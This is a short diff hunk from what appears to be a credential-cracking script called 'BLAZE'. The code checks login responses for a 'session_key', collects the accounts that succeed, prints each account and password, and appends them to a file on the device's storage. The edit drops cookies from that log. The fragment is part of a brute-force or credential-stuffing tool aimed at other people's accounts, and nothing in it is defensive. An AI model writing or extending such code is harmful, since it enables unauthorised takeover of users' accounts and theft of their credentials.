@@ -974,7 +974,7 @@ def method():
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'  ')
-                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} | {pword} | {cookies}n')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc} | {pword}n')
                 if c=='y':
                  try:  
                   q = json.loads(response.text)
